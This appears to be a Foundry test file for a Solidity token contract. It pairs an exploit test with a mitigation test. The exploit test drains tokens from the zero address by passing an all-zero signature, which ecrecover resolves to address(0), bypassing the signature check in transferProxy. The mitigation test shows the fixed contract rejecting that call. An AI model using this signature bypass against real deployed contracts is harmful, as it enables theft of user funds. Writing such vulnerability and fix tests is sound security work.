// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/A12/TransferProxyKeccak.sol";
import "../src/A12/TransferProxyKeccakFixed.sol";

contract TransferProxyKeccakTest is Test {
    TransferProxyKeccak internal vulnerableToken;
    TransferProxyKeccakFixed internal fixedToken;

    uint256 internal constant TOTAL_SUPPLY = 1_000_000 * 1e18;
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vulnerableToken = new TransferProxyKeccak();
    }

    // --- VULNERABILITY TEST ---

    function test_Exploit_DrainFromZeroAddressWithInvalidSignature() public {
        // Arrange: Check initial balances.
        assertEq(vulnerableToken.balanceOf(attacker), 0);

        // Attacker prepares malicious arguments.
        address from = address(0);
        address to = attacker;
        uint256 valueToSteal = 100 * 1e18;
        uint256 feeMesh = 0;

        // An invalid signature (all zeros). ecrecover will fail and return address(0).
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);

        // Act: Attacker calls transferProxy. The signature check will be bypassed.
        vm.prank(attacker);
        vulnerableToken.transferProxy(from, to, valueToSteal, feeMesh, v, r, s);

        assertEq(
            vulnerableToken.balanceOf(attacker),
            valueToSteal,
            "Attacker's balance should have increased"
        );
        // Also check if the nonce for the zero address was updated.
        assertEq(
            vulnerableToken.nonce(address(0)),
            1,
            "Nonce for zero address should be 1"
        );
    }

    // --- MITIGATION TEST ---

    function test_Mitigation_CannotDrainFromZeroAddress() public {
        // Arrange: Deploy the fixed contract and prepare malicious arguments.
        fixedToken = new TransferProxyKeccakFixed();

        address from = address(0);
        address to = attacker;
        uint256 valueToSteal = 100 * 1e18;
        uint256 feeMesh = 0;
        uint8 v = 0;
        bytes32 r = bytes32(0);
        bytes32 s = bytes32(0);

        // Act & Assert: The call should now revert because of the explicit check.
        vm.prank(attacker);
        vm.expectRevert("From address cannot be zero");
        fixedToken.transferProxy(from, to, valueToSteal, feeMesh, v, r, s);

        // Sanity check: ensure balances did not change.
        assertEq(fixedToken.balanceOf(attacker), 0);
    }
}
